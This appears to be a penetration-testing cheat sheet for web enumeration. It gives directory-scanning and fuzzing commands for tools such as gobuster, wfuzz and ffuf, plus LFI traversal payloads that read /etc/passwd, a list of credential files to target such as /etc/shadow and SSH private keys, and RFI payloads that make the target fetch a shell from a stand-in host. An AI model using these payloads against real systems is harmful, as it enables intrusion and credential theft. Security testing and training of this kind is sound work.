# Web Enumeration

{% hint style="info" %}
If you are running BurpSuite proxy or FoxyProxy disable the interception before starting the tests.
{% endhint %}

### Common Wordlists to use for Web App Scanning:

Common Wordlists to use for Web Directory Scanning:

* /usr/share/wordlists/dirb/common.txt
* /usr/share/wordlists/dirbuster/\*.txt
* /usr/share/wordlists/wfuzz/general/\*.txt
* /usr/share/seclists/Discovery/Web-Content/

Common Wordlists to use for User Enumeration Scanning:

* /usr/share/seclists/Usernames
* /usr/share/wordlists/dirbuster/apache-user-enum-2.0

### Web App Scanners

#### Nikto

```
nikto --url
```

#### Wpscan

```
wpscan --url
wpscan --url --enumerate ap at (All Plugins, All Themes)
wpscan --url --enumerate u (Usernames)
wpscan --url --enumerate v
```

### Web Tools for Directory Scanning:

#### Dirb

```
dirb <domain>
dirb <domain> <wordlist>
```

#### Gobuster

```
gobuster dir -u -w /usr/share/wordlists/
gobuster dir -u -w /usr/share/wordlists/ -a Firefox (Custom Agent)
gobuster dir -u -w /usr/share/wordlists/ -x .php,.txt,.html
gobuster dir -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200"
gobuster dir -e -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200"
gobuster dir -v -e -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200"
gobuster dir -v -e -u -w /usr/share/wordlists/ -x .php,.txt,.html -s "200" -o output.txt
```

With a specific user-agent:

```
gobuster dir -s 200,204,301,302,307,403 -u 172.21.0.0 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
```

#### Wfuzz

```
wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ
wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
```

Post Requests

```
wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ" --hc 302 http://testphp.vulnweb.com/userinfo.php
```

Fuzzing Cookies

```
wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ
```

#### Dirsearch

```
dirsearch /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 172.21.0.0 -e php
```

#### FFuF

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.21.0.0
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -b "COOKIE VALUE; security=low" -u http://172.21.0.0
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.21.0.0 -fc 403, 302, 200
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Host: 172.21.0.0" -u http://172.21.0.0
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.21.0.0 -timeout 5
```

#### Other Tools

* Burp Suite
* OWASP Zap
* Cadaver
* SQLMap
* Joomscan
* Feroxbuster

### Testing for LFI:

[https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf](https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-\(lfi\).pdf)

#### Examples

```
http://example.com/index.php?page=etc/passwd 
http://example.com/index.php?page=etc/passwd%00 
http://example.com/index.php?page=../../etc/passwd 
http://example.com/index.php?page=%252e%252e%252f 
http://example.com/index.php?page=....//....//etc/passwd
```

### Interesting Files

#### Linux

```
/etc/passwd 
/etc/shadow 
/etc/issue 
/etc/group 
/etc/hostname 
/etc/ssh/ssh_config 
/etc/ssh/sshd_config 
/root/.ssh/id_rsa 
/root/.ssh/authorized_keys 
/home/user/.ssh/authorized_keys 
/home/user/.ssh/id_rsa
```

#### Windows

```
/boot.ini 
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
```

### Testing for RFI:

```
http://example.com/index.php?page=http://callback.com/shell.txt 
http://example.com/index.php?page=http://callback.com/shell.txt%00 
http://example.com/index.php?page=http:%252f%252fcallback.com%252fshell.txt
```

### Resources

* Turning LFI to RFI: [https://l.avala.mp/?p=241](https://l.avala.mp/?p=241)
